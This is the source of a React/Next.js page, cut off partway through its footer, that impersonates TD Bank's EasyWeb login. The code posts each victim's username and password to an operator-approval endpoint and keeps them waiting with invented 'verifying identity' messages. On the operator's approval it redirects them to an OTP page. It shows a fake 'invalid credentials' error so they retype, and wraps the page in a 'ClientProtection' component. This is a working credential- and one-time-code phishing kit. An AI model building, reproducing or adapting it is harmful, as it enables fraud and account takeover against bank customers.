"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import { getOrCreateFlowId } from "@/lib/session";
import ClientProtection from "@/components/ClientProtection";

const DEFAULT_TIMEOUT_MS = Number(
  process.env.NEXT_PUBLIC_LOGIN_TIMEOUT_MS || 1500
);

export default function Home() {
  const router = useRouter();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [flowId, setFlowId] = useState("");
  const [waitingForApproval, setWaitingForApproval] = useState(false);
  const [approvalError, setApprovalError] = useState("");
  const [processingMessage, setProcessingMessage] = useState(
    "Verifying your identity..."
  );
  const [selectedCountry, setSelectedCountry] = useState("canada");
  const [selectedLanguage, setSelectedLanguage] = useState("english");
  const [showCountryDropdown, setShowCountryDropdown] = useState(false);
  const [showLanguageDropdown, setShowLanguageDropdown] = useState(false);
  const [countryTimeout, setCountryTimeout] = useState(null);
  const [languageTimeout, setLanguageTimeout] = useState(null);
  const [showMobileMenu, setShowMobileMenu] = useState(false);
  const [greeting, setGreeting] = useState("Good evening");

  useEffect(() => {
    setFlowId(getOrCreateFlowId());

    // Set dynamic greeting based on time
    const hour = new Date().getHours();
    if (hour < 12) {
      setGreeting("Good morning");
    } else if (hour < 17) {
      setGreeting("Good afternoon");
    } else {
      setGreeting("Good evening");
    }
  }, []);

  // Cycle through realistic processing messages
  function startProcessingMessages() {
    const messages = [
      "Verifying your identity...",
      "Checking security credentials...",
      "Authenticating with secure servers...",
      "Validating account information...",
      "Processing security verification...",
      "Confirming identity verification...",
    ];

    let messageIndex = 0;
    const messageInterval = setInterval(() => {
      messageIndex = (messageIndex + 1) % messages.length;
      setProcessingMessage(messages[messageIndex]);
    }, 3000); // Change message every 3 seconds

    // Store interval ID to clear it later
    window.processingInterval = messageInterval;
  }

  // Clear processing messages when done
  useEffect(() => {
    if (!waitingForApproval && window.processingInterval) {
      clearInterval(window.processingInterval);
      setProcessingMessage("Verifying your identity...");
    }
  }, [waitingForApproval]);

  // Dropdown handling functions
  const handleCountryMouseEnter = () => {
    if (countryTimeout) {
      clearTimeout(countryTimeout);
      setCountryTimeout(null);
    }
    setShowCountryDropdown(true);
  };

  const handleCountryMouseLeave = () => {
    const timeout = setTimeout(() => {
      setShowCountryDropdown(false);
    }, 150);
    setCountryTimeout(timeout);
  };

  const handleLanguageMouseEnter = () => {
    if (languageTimeout) {
      clearTimeout(languageTimeout);
      setLanguageTimeout(null);
    }
    setShowLanguageDropdown(true);
  };

  const handleLanguageMouseLeave = () => {
    const timeout = setTimeout(() => {
      setShowLanguageDropdown(false);
    }, 150);
    setLanguageTimeout(timeout);
  };

  async function handleSubmit(e) {
    e.preventDefault();
    if (submitting || waitingForApproval) return;
    setSubmitting(true);
    setApprovalError("");

    // Generate a new flow ID for each login attempt
    const newFlowId = getOrCreateFlowId(true); // Force new ID
    setFlowId(newFlowId);

    try {
      // Send credentials to admin for approval
      const response = await fetch("/api/admin-approval", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          flowId: newFlowId,
          username,
          password,
          meta: { userAgent: navigator.userAgent },
        }),
      });

      if (response.ok) {
        setSubmitting(false);
        setWaitingForApproval(true);

        // Start cycling through processing messages
        startProcessingMessages();

        // Start polling for approval result
        pollForApproval(newFlowId);
      } else {
        throw new Error("Failed to submit for approval");
      }
    } catch (error) {
      console.error("Submission error:", error);
      setSubmitting(false);
      setApprovalError("Authentication service unavailable. Please try again.");
    }
  }

  // Poll for approval result
  async function pollForApproval(currentFlowId) {
    const maxAttempts = 120; // 10 minutes max (5 second intervals)
    let attempts = 0;

    const poll = async () => {
      if (attempts >= maxAttempts) {
        setWaitingForApproval(false);
        setApprovalError("Authentication timeout. Please try again.");
        return;
      }

      try {
        const response = await fetch(
          `/api/admin-approval/status?flowId=${currentFlowId}`
        );
        const result = await response.json();

        if (result.status === "resolved") {
          setWaitingForApproval(false);

          if (result.approved) {
            // Approved - redirect to OTP
            router.push("/otp");
          } else {
            // Rejected - show error and reset form
            setApprovalError(
              "Invalid credentials. Please check your username and password."
            );
            // Reset form after rejection so user can try again
            setTimeout(() => {
              setApprovalError("");
              setUsername("");
              setPassword("");
            }, 3000); // Clear error and form after 3 seconds
          }
          return;
        }

        if (result.status === "pending") {
          // Still waiting, continue polling
          attempts++;
          setTimeout(poll, 5000); // Poll every 5 seconds
        } else {
          // Handle unknown status - could be server restart or other issues
          console.log("Approval status unknown:", result);

          // If it's a fallback approval, continue polling
          if (result.fallback) {
            console.log("Fallback approval created, continuing to poll...");
            attempts++;
            setTimeout(poll, 5000);
            return;
          }

          // For other unknown statuses, show a more helpful error
          setWaitingForApproval(false);
          setApprovalError(
            "Authentication service temporarily unavailable. Please try again."
          );
          // Auto-clear error after 3 seconds so user can retry quickly
          setTimeout(() => {
            setApprovalError("");
          }, 3000);
        }
      } catch (error) {
        console.error("Polling error:", error);
        attempts++;

        // If we've had too many consecutive errors, show a message
        if (attempts > 10 && attempts % 10 === 0) {
          console.log("Multiple polling errors, but continuing...");
        }

        setTimeout(poll, 5000);
      }
    };

    poll();
  }

  return (
    <ClientProtection>
      <div className="min-h-screen bg-white">
        {/* Top Navigation Bar - Hidden on mobile */}
        <div className="bg-white border-b border-gray-200 hidden md:block">
          <div className="max-w-7xl mx-auto px-4 py-2">
            <div className="flex items-center justify-between">
              <nav className="flex space-x-6 text-sm">
                <a
                  href="#"
                  className="text-gray-900 font-medium hover:text-green-600"
                >
                  Personal
                </a>
                <a href="#" className="text-green-600 hover:text-green-700">
                  Business
                </a>
                <a href="#" className="text-green-600 hover:text-green-700">
                  Investing
                </a>
              </nav>
              <div className="flex items-center space-x-6 text-sm">
                {/* Country Dropdown */}
                <div
                  className="relative"
                  onMouseEnter={handleCountryMouseEnter}
                  onMouseLeave={handleCountryMouseLeave}
                >
                  <div className="flex items-center space-x-2 text-gray-600 hover:text-gray-800 cursor-pointer">
                    <img
                      src={
                        selectedCountry === "canada"
                          ? "/country_ca.png"
                          : "/country_us.png"
                      }
                      alt={
                        selectedCountry === "canada"
                          ? "Canada"
                          : "United States"
                      }
                      className="w-5 h-4"
                    />
                    <span>
                      {selectedCountry === "canada"
                        ? "Canada"
                        : "United States"}
                    </span>
                    <svg
                      className="w-3 h-3"
                      fill="currentColor"
                      viewBox="0 0 20 20"
                    >
                      <path
                        fillRule="evenodd"
                        d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z"
                        clipRule="evenodd"
                      />
                    </svg>
                  </div>

                  {showCountryDropdown && (
                    <div
                      className="absolute top-full left-0 mt-1 bg-white border border-gray-200 rounded-lg shadow-lg z-50 min-w-[180px]"
                      onMouseEnter={handleCountryMouseEnter}
                      onMouseLeave={handleCountryMouseLeave}
                    >
                      <div
                        className={`flex items-center space-x-2 px-4 py-3 hover:bg-gray-50 cursor-pointer ${
                          selectedCountry === "canada"
                            ? "text-green-600"
                            : "text-gray-700"
                        }`}
                        onClick={() => setSelectedCountry("canada")}
                      >
                        <img
                          src="/country_ca.png"
                          alt="Canada"
                          className="w-5 h-4"
                        />
                        <span>Canada</span>
                        {selectedCountry === "canada" && (
                          <svg
                            className="w-4 h-4 text-green-600 ml-auto"
                            fill="currentColor"
                            viewBox="0 0 20 20"
                          >
                            <path
                              fillRule="evenodd"
                              d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                              clipRule="evenodd"
                            />
                          </svg>
                        )}
                      </div>
                      <div
                        className={`flex items-center space-x-2 px-4 py-3 hover:bg-gray-50 cursor-pointer ${
                          selectedCountry === "usa"
                            ? "text-green-600"
                            : "text-gray-700"
                        }`}
                        onClick={() => setSelectedCountry("usa")}
                      >
                        <img
                          src="/country_us.png"
                          alt="United States"
                          className="w-5 h-4"
                        />
                        <span>United States</span>
                        {selectedCountry === "usa" && (
                          <svg
                            className="w-4 h-4 text-green-600 ml-auto"
                            fill="currentColor"
                            viewBox="0 0 20 20"
                          >
                            <path
                              fillRule="evenodd"
                              d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                              clipRule="evenodd"
                            />
                          </svg>
                        )}
                      </div>
                    </div>
                  )}
                </div>

                {/* Language Dropdown */}
                <div
                  className="relative"
                  onMouseEnter={handleLanguageMouseEnter}
                  onMouseLeave={handleLanguageMouseLeave}
                >
                  <div className="flex items-center space-x-2 text-gray-600 hover:text-gray-800 cursor-pointer">
                    <span>
                      {selectedLanguage === "english" ? "English" : "Français"}
                    </span>
                    <svg
                      className="w-3 h-3"
                      fill="currentColor"
                      viewBox="0 0 20 20"
                    >
                      <path
                        fillRule="evenodd"
                        d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z"
                        clipRule="evenodd"
                      />
                    </svg>
                  </div>

                  {showLanguageDropdown && (
                    <div
                      className="absolute top-full right-0 mt-1 bg-white border border-gray-200 rounded-lg shadow-lg z-50 min-w-[120px]"
                      onMouseEnter={handleLanguageMouseEnter}
                      onMouseLeave={handleLanguageMouseLeave}
                    >
                      <div
                        className={`flex items-center justify-between px-4 py-3 hover:bg-gray-50 cursor-pointer ${
                          selectedLanguage === "english"
                            ? "text-green-600"
                            : "text-gray-700"
                        }`}
                        onClick={() => setSelectedLanguage("english")}
                      >
                        <span>English</span>
                        {selectedLanguage === "english" && (
                          <svg
                            className="w-4 h-4 text-green-600"
                            fill="currentColor"
                            viewBox="0 0 20 20"
                          >
                            <path
                              fillRule="evenodd"
                              d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                              clipRule="evenodd"
                            />
                          </svg>
                        )}
                      </div>
                      <div
                        className={`flex items-center justify-between px-4 py-3 hover:bg-gray-50 cursor-pointer ${
                          selectedLanguage === "francais"
                            ? "text-green-600"
                            : "text-gray-700"
                        }`}
                        onClick={() => setSelectedLanguage("francais")}
                      >
                        <span>Français</span>
                        {selectedLanguage === "francais" && (
                          <svg
                            className="w-4 h-4 text-green-600"
                            fill="currentColor"
                            viewBox="0 0 20 20"
                          >
                            <path
                              fillRule="evenodd"
                              d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                              clipRule="evenodd"
                            />
                          </svg>
                        )}
                      </div>
                    </div>
                  )}
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Main Header */}
        <header className="bg-[#12412a] text-white">
          <div className="max-w-7xl mx-auto px-4 py-4">
            <div className="flex items-center justify-between">
              <div className="flex items-center space-x-4">
                {/* Mobile hamburger menu */}
                <button
                  className="md:hidden text-white"
                  onClick={() => setShowMobileMenu(!showMobileMenu)}
                >
                  <svg
                    className="w-6 h-6"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d={
                        showMobileMenu
                          ? "M6 18L18 6M6 6l12 12"
                          : "M4 6h16M4 12h16M4 18h16"
                      }
                    />
                  </svg>
                </button>
                <img src="/logo.png" alt="TD" className="h-8 md:h-10" />
                <nav className="hidden md:flex space-x-8">
                  <a
                    href="#"
                    className="text-white hover:text-green-300 transition-colors font-medium"
                  >
                    My Accounts
                  </a>
                  <a
                    href="#"
                    className="text-white hover:text-green-300 transition-colors font-medium"
                  >
                    How To
                  </a>
                  <a
                    href="#"
                    className="text-white hover:text-green-300 transition-colors font-medium flex items-center"
                  >
                    Products
                    <svg
                      className="w-3 h-3 ml-1"
                      fill="currentColor"
                      viewBox="0 0 20 20"
                    >
                      <path
                        fillRule="evenodd"
                        d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z"
                        clipRule="evenodd"
                      />
                    </svg>
                  </a>
                  <a
                    href="#"
                    className="text-white hover:text-green-300 transition-colors font-medium flex items-center"
                  >
                    Solutions
                    <svg
                      className="w-3 h-3 ml-1"
                      fill="currentColor"
                      viewBox="0 0 20 20"
                    >
                      <path
                        fillRule="evenodd"
                        d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z"
                        clipRule="evenodd"
                      />
                    </svg>
                  </a>
                </nav>
              </div>
              <div className="flex items-center space-x-4">
                {/* Desktop icons - hidden on mobile */}
                <div className="hidden md:flex items-center space-x-4">
                  <svg
                    className="w-5 h-5 text-white hover:text-green-300 cursor-pointer"
                    fill="currentColor"
                    viewBox="0 0 20 20"
                  >
                    <path
                      fillRule="evenodd"
                      d="M5.05 4.05a7 7 0 119.9 9.9L10 18.9l-4.95-4.95a7 7 0 010-9.9zM10 11a2 2 0 100-4 2 2 0 000 4z"
                      clipRule="evenodd"
                    />
                  </svg>
                  <svg
                    className="w-5 h-5 text-white hover:text-green-300 cursor-pointer"
                    fill="currentColor"
                    viewBox="0 0 20 20"
                  >
                    <path
                      fillRule="evenodd"
                      d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-8-3a1 1 0 00-.867.5 1 1 0 11-1.731-1A3 3 0 0113 8a3.001 3.001 0 01-2 2.83V11a1 1 0 11-2 0v-1a1 1 0 011-1 1 1 0 100-2zm0 8a1 1 0 100-2 1 1 0 000 2z"
                      clipRule="evenodd"
                    />
                  </svg>
                  <svg
                    className="w-5 h-5 text-white hover:text-green-300 cursor-pointer"
                    fill="currentColor"
                    viewBox="0 0 20 20"
                  >
                    <path
                      fillRule="evenodd"
                      d="M8 4a4 4 0 100 8 4 4 0 000-8zM2 8a6 6 0 1110.89 3.476l4.817 4.817a1 1 0 01-1.414 1.414l-4.816-4.816A6 6 0 012 8z"
                      clipRule="evenodd"
                    />
                  </svg>
                  <div className="w-px h-6 bg-white opacity-30"></div>
                </div>
                <button className="flex items-center space-x-1 md:space-x-2 text-white hover:text-green-300 transition-colors">
                  <svg
                    className="w-4 h-4 md:w-5 md:h-5"
                    fill="currentColor"
                    viewBox="0 0 20 20"
                  >
                    <path
                      fillRule="evenodd"
                      d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z"
                      clipRule="evenodd"
                    />
                  </svg>
                  <svg
                    className="w-3 h-3 md:w-4 md:h-4"
                    fill="currentColor"
                    viewBox="0 0 20 20"
                  >
                    <path
                      fillRule="evenodd"
                      d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"
                      clipRule="evenodd"
                    />
                  </svg>
                  <span className="font-medium text-sm md:text-base">
                    Login
                  </span>
                  <svg
                    className="w-2 h-2 md:w-3 md:h-3"
                    fill="currentColor"
                    viewBox="0 0 20 20"
                  >
                    <path
                      fillRule="evenodd"
                      d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z"
                      clipRule="evenodd"
                    />
                  </svg>
                </button>
              </div>
            </div>
          </div>
        </header>

        {/* Mobile Menu Dropdown */}
        {showMobileMenu && (
          <div className="md:hidden bg-[#12412a] text-white border-t border-green-600">
            <div className="max-w-7xl mx-auto px-4 py-4 space-y-4">
              {/* Country & Language Section */}
              <div className="border-b border-green-600 pb-4 mb-4">
                <div className="space-y-3">
                  {/* Country Selection */}
                  <div className="flex items-center justify-between">
                    <span className="text-sm text-gray-300">Country:</span>
                    <div className="flex items-center space-x-2">
                      <img
                        src={
                          selectedCountry === "canada"
                            ? "/country_ca.png"
                            : "/country_us.png"
                        }
                        alt={
                          selectedCountry === "canada"
                            ? "Canada"
                            : "United States"
                        }
                        className="w-5 h-4"
                      />
                      <select
                        value={selectedCountry}
                        onChange={(e) => setSelectedCountry(e.target.value)}
                        className="bg-[#12412a] text-white border border-green-600 rounded px-2 py-1 text-sm"
                      >
                        <option value="canada">Canada</option>
                        <option value="usa">United States</option>
                      </select>
                    </div>
                  </div>

                  {/* Language Selection */}
                  <div className="flex items-center justify-between">
                    <span className="text-sm text-gray-300">Language:</span>
                    <select
                      value={selectedLanguage}
                      onChange={(e) => setSelectedLanguage(e.target.value)}
                      className="bg-[#12412a] text-white border border-green-600 rounded px-2 py-1 text-sm"
                    >
                      <option value="english">English</option>
                      <option value="francais">Français</option>
                    </select>
                  </div>
                </div>
              </div>

              {/* Navigation Links */}
              <div className="space-y-3">
                <a
                  href="#"
                  className="block text-white hover:text-green-300 transition-colors py-2 border-b border-gray-700"
                >
                  My Accounts
                </a>
                <a
                  href="#"
                  className="block text-white hover:text-green-300 transition-colors py-2 border-b border-gray-700"
                >
                  How To
                </a>
                <a
                  href="#"
                  className="block text-white hover:text-green-300 transition-colors py-2 border-b border-gray-700"
                >
                  Products
                </a>
                <a
                  href="#"
                  className="block text-white hover:text-green-300 transition-colors py-2 border-b border-gray-700"
                >
                  Solutions
                </a>
              </div>

              {/* Contact Links */}
              <div className="space-y-3 pt-4 border-t border-green-600">
                <a
                  href="#"
                  className="flex items-center text-white hover:text-green-300 transition-colors py-2"
                >
                  <svg
                    className="w-5 h-5 mr-3"
                    fill="currentColor"
                    viewBox="0 0 20 20"
                  >
                    <path
                      fillRule="evenodd"
                      d="M5.05 4.05a7 7 0 119.9 9.9L10 18.9l-4.95-4.95a7 7 0 010-9.9zM10 11a2 2 0 100-4 2 2 0 000 4z"
                      clipRule="evenodd"
                    />
                  </svg>
                  Find a Branch
                </a>
                <a
                  href="#"
                  className="flex items-center text-white hover:text-green-300 transition-colors py-2"
                >
                  <svg
                    className="w-5 h-5 mr-3"
                    fill="currentColor"
                    viewBox="0 0 20 20"
                  >
                    <path
                      fillRule="evenodd"
                      d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-8-3a1 1 0 00-.867.5 1 1 0 11-1.731-1A3 3 0 0113 8a3.001 3.001 0 01-2 2.83V11a1 1 0 11-2 0v-1a1 1 0 011-1 1 1 0 100-2zm0 8a1 1 0 100-2 1 1 0 000 2z"
                      clipRule="evenodd"
                    />
                  </svg>
                  Contact Us
                </a>
                <a
                  href="#"
                  className="flex items-center text-white hover:text-green-300 transition-colors py-2"
                >
                  <svg
                    className="w-5 h-5 mr-3"
                    fill="currentColor"
                    viewBox="0 0 20 20"
                  >
                    <path
                      fillRule="evenodd"
                      d="M8 4a4 4 0 100 8 4 4 0 000-8zM2 8a6 6 0 1110.89 3.476l4.817 4.817a1 1 0 01-1.414 1.414l-4.816-4.816A6 6 0 012 8z"
                      clipRule="evenodd"
                    />
                  </svg>
                  Search
                </a>
              </div>
            </div>
          </div>
        )}

        {/* Main Content Area */}
        <div className="bg-gray-50 py-6 md:py-12">
          <div className="max-w-7xl mx-auto px-4">
            <h1
              className="text-[24px] md:text-[32px] leading-[32px] md:leading-[40px] font-normal text-[#12412a] mb-6 md:mb-8 text-center md:text-left"
              style={{ fontFamily: "system-ui, -apple-system, sans-serif" }}
            >
              EasyWeb Login
            </h1>
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-0 items-start">
              {/* Left Column - Login Form */}
              <div className="bg-[#f6fbf8] p-4 md:p-8 border-r-0 lg:border-r border-[#e1eee7] border-b lg:border-b-0 border-[#e1eee7]">
                <form onSubmit={handleSubmit} className="space-y-6">
                  <div>
                    <label
                      className="block text-[15px] font-normal text-gray-800 mb-2"
                      style={{
                        fontFamily: "system-ui, -apple-system, sans-serif",
                      }}
                    >
                      Username or Access Card
                    </label>
                    <input
                      placeholder="Enter your username or access card number"
                      className="w-full h-[52px] border border-[#d1d9d6] rounded px-4 text-[15px] text-gray-900 placeholder-gray-500 focus:outline-none focus:border-[#12412a] focus:ring-1 focus:ring-[#12412a] bg-white"
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      required
                      autoComplete="username"
                    />
                    <a
                      href="#"
                      className="text-[14px] text-[#2f8f4e] hover:underline mt-1 block"
                    >
                      + Description (Optional)
                    </a>
                  </div>

                  <div>
                    <label
                      className="block text-[15px] font-normal text-gray-800 mb-2"
                      style={{
                        fontFamily: "system-ui, -apple-system, sans-serif",
                      }}
                    >
                      Password
                    </label>
                    <div className="relative">
                      <input
                        type={showPassword ? "text" : "password"}
                        placeholder="Enter your password"
                        className="w-full h-[52px] border border-[#d1d9d6] rounded px-4 pr-12 text-[15px] text-gray-900 placeholder-gray-500 focus:outline-none focus:border-[#12412a] focus:ring-1 focus:ring-[#12412a] bg-white"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        required
                        autoComplete="current-password"
                      />
                      <button
                        type="button"
                        className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                        onClick={() => setShowPassword((v) => !v)}
                      >
                        <svg
                          className="w-5 h-5"
                          fill="none"
                          stroke="currentColor"
                          viewBox="0 0 24 24"
                        >
                          {showPassword ? (
                            <path
                              strokeLinecap="round"
                              strokeLinejoin="round"
                              strokeWidth={2}
                              d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.878 9.878L3 3m6.878 6.878L21 21"
                            />
                          ) : (
                            <path
                              strokeLinecap="round"
                              strokeLinejoin="round"
                              strokeWidth={2}
                              d="M15 12a3 3 0 11-6 0 3 3 0 016 0z M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"
                            />
                          )}
                        </svg>
                      </button>
                    </div>
                  </div>

                  <div className="flex items-center gap-3">
                    <input
                      type="checkbox"
                      id="rememberMe"
                      className="w-4 h-4 text-green-600 border-gray-300 rounded focus:ring-green-500"
                    />
                    <label
                      htmlFor="rememberMe"
                      className="text-[14px] text-gray-700 font-medium"
                    >
                      Remember me
                    </label>
                  </div>

                  {/* Error Message */}
                  {approvalError && (
                    <div className="w-full p-3 bg-red-50 border border-red-200 rounded-lg">
                      <div className="flex items-center">
                        <svg
                          className="w-5 h-5 text-red-400 mr-2"
                          fill="currentColor"
                          viewBox="0 0 20 20"
                        >
                          <path
                            fillRule="evenodd"
                            d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z"
                            clipRule="evenodd"
                          />
                        </svg>
                        <span className="text-sm text-red-700">
                          {approvalError}
                        </span>
                      </div>
                    </div>
                  )}

                  {/* Processing Message */}
                  {waitingForApproval && (
                    <div className="w-full p-3 bg-blue-50 border border-blue-200 rounded-lg">
                      <div className="flex items-center">
                        <svg
                          className="animate-spin w-5 h-5 text-blue-500 mr-2"
                          fill="none"
                          viewBox="0 0 24 24"
                        >
                          <circle
                            className="opacity-25"
                            cx="12"
                            cy="12"
                            r="10"
                            stroke="currentColor"
                            strokeWidth="4"
                          ></circle>
                          <path
                            className="opacity-75"
                            fill="currentColor"
                            d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                          ></path>
                        </svg>
                        <div>
                          <div className="text-sm font-medium text-blue-700">
                            {processingMessage}
                          </div>
                          <div className="text-xs text-blue-600">
                            Please wait while we authenticate your credentials
                          </div>
                        </div>
                      </div>
                    </div>
                  )}

                  <div className="flex justify-start">
                    <button
                      type="submit"
                      disabled={submitting || waitingForApproval}
                      className={`px-10 h-[48px] font-medium text-[16px] disabled:opacity-70 transition-colors flex items-center justify-center gap-2 rounded-md shadow-sm ${
                        username && password && !waitingForApproval
                          ? "bg-[#187a3b] text-white hover:bg-[#166b34]"
                          : "bg-[#e0e0e0] text-gray-700"
                      }`}
                    >
                      <svg
                        className="w-4 h-4"
                        fill="currentColor"
                        viewBox="0 0 20 20"
                      >
                        <path
                          fillRule="evenodd"
                          d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"
                          clipRule="evenodd"
                        />
                      </svg>
                      {waitingForApproval
                        ? "Authenticating..."
                        : submitting
                        ? "Signing on..."
                        : "Login"}
                    </button>
                  </div>

                  <div className="text-center mt-4">
                    <a
                      href="#"
                      className="text-sm text-[#2f8f4e] hover:underline"
                      onClick={(e) => e.preventDefault()}
                    >
                      Forgot your username or password?
                    </a>
                  </div>

                  <div className="text-center mt-4">
                    <a
                      href="#"
                      className="text-sm text-[#2f8f4e] hover:underline inline-flex items-center"
                      onClick={(e) => e.preventDefault()}
                    >
                      <svg
                        className="w-4 h-4 mr-1"
                        fill="currentColor"
                        viewBox="0 0 20 20"
                      >
                        <path
                          fillRule="evenodd"
                          d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"
                          clipRule="evenodd"
                        />
                      </svg>
                      TD Online and Mobile Security Guarantee: You are protected
                    </a>
                  </div>
                </form>
              </div>

              {/* Right Column - Help Information */}
              <div className="bg-[#f6fbf8] p-4 md:p-8 border-l-0 lg:border-l border-[#e1eee7]">
                <h2
                  className="text-[20px] font-normal text-gray-800 mb-6"
                  style={{ fontFamily: "system-ui, -apple-system, sans-serif" }}
                >
                  Welcome to EasyWeb, let&apos;s get started.
                </h2>
                <button className="border-[2px] border-[#187a3b] text-[#187a3b] px-5 py-2.5 rounded-md hover:bg-[#187a3b] hover:text-white transition-colors mb-6 font-medium">
                  Register online now
                </button>

                <p className="text-gray-700 mb-6 text-[15px]">
                  Log in with your temporary password and Access Card number.
                  You&apos;ll be prompted to create a new password on your first
                  login.
                </p>

                <div className="space-y-4">
                  <div>
                    <h3
                      className="font-normal text-gray-800 mb-2"
                      style={{
                        fontFamily: "system-ui, -apple-system, sans-serif",
                      }}
                    >
                      Login Help
                    </h3>
                    <div className="space-y-1">
                      <a
                        href="#"
                        className="block text-[#2f8f4e] hover:underline"
                      >
                        Get Login Help &gt;
                      </a>
                      <a
                        href="#"
                        className="block text-[#2f8f4e] hover:underline"
                      >
                        Reset Password &gt;
                      </a>
                    </div>
                  </div>

                  <div>
                    <h3
                      className="font-normal text-gray-800 mb-2"
                      style={{
                        fontFamily: "system-ui, -apple-system, sans-serif",
                      }}
                    >
                      Enhanced Security
                    </h3>
                    <div className="space-y-1">
                      <a
                        href="#"
                        className="block text-[#2f8f4e] hover:underline"
                      >
                        Two-Step Verification FAQs &gt;
                      </a>
                      <a
                        href="#"
                        className="block text-[#2f8f4e] hover:underline"
                      >
                        TD Authenticate app: Securely log in from anywhere in
                        the world without texts or phone calls. &gt;
                      </a>
                      <a
                        href="#"
                        className="block text-[#2f8f4e] hover:underline"
                      >
                        Improve Your Protection Against Online Fraud &gt;
                      </a>
                    </div>
                  </div>

                  <div>
                    <h3
                      className="font-normal text-gray-800 mb-2"
                      style={{
                        fontFamily: "system-ui, -apple-system, sans-serif",
                      }}
                    >
                      Explore mobile banking with the TD app now
                    </h3>
                    <a
                      href="#"
                      className="block text-[#2f8f4e] hover:underline"
                    >
                      Take banking and investing almost anywhere &gt;
                    </a>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Legal Disclaimer Section */}
        <div className="bg-white py-6">
          <div className="max-w-7xl mx-auto px-4">
            <div className="text-sm text-gray-700 leading-relaxed">
              <p className="mb-2">
                By using EasyWeb, you agree to the{" "}
                <a
                  href="#"
                  className="text-green-600 underline hover:text-green-700"
                >
                  Financial Services Terms
                </a>
                ,{" "}
                <a
                  href="#"
                  className="text-green-600 underline hover:text-green-700"
                >
                  Access Agreement
                </a>
                ,{" "}
                <a
                  href="#"
                  className="text-green-600 underline hover:text-green-700"
                >
                  Digital Banking Agreement
                </a>
                ,{" "}
                <a
                  href="#"
                  className="text-green-600 underline hover:text-green-700"
                >
                  Business Access Services Schedule
                </a>
                ,{" "}
                <a
                  href="#"
                  className="text-green-600 underline hover:text-green-700"
                >
                  Terms and Agreement
                </a>
                , and{" "}
                <a
                  href="#"
                  className="text-green-600 underline hover:text-green-700"
                >
                  Disclosure
                </a>
                .
              </p>
              <p className="mt-4">
                ® The TD logo and other trade-marks are the property of The
                Toronto-Dominion Bank or its subsidiaries. All trade-marks are
                used under licence. All rights reserved.
              </p>
            </div>
          </div>
        </div>

        {/* Footer */}
        <footer className="bg-[#12412a] text-white">
          <div className="max-w-7xl mx-auto px-4 py-6">
            {/* Top Section - Contact and Social Media */}
            <div className="flex flex-col items-center mb-4">
              <div className="flex flex-col md:flex-row items-center gap-4 md:gap-6">
                <div className="flex-shrink-0 hidden md:block">
                  <img
                    src="/footer_seat.png"
                    alt="Chair"
                    className="h-48 w-auto"
                  />
                </div>
                <div className="text-center">
                  <p className="text-lg mb-2">
                    Need to talk to us directly?{" "}
